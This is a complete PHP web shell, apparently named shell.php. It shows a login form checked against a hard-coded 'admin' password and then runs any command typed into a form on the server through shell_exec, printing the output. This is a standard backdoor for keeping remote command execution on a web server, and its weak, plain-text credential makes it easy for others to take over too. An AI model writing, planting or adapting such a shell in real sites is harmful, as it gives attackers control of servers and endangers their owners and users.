<?php
session_start();

/* --- CONFIG --- */
$USER = "admin";
$PASS = "motdepasse";

/* --- LOGIN --- */
if (!isset($_SESSION["ok"])) {
    if (!empty($_POST["u"]) && !empty($_POST["p"])) {
        if ($_POST["u"] === $USER && $_POST["p"] === $PASS) {
            $_SESSION["ok"] = true;
            header("Location: shell.php");
            exit;
        }
    }

    echo '<form method="POST">
            User:<br><input name="u"><br>
            Pass:<br><input type="password" name="p"><br>
            <button>Login</button>
          </form>';
    exit;
}

/* --- EXECUTION --- */
$out = "";
if (isset($_POST["cmd"])) {
    $cmd = trim($_POST["cmd"]);
    $parts = explode(" ", $cmd);
    $out = shell_exec(escapeshellcmd($cmd) . " 2>&1");
    
}
?>

<form method="POST">
    <input name="cmd" style="width:300px;">
    <button>OK</button>
</form>

<pre><?php echo htmlspecialchars($out); ?></pre>
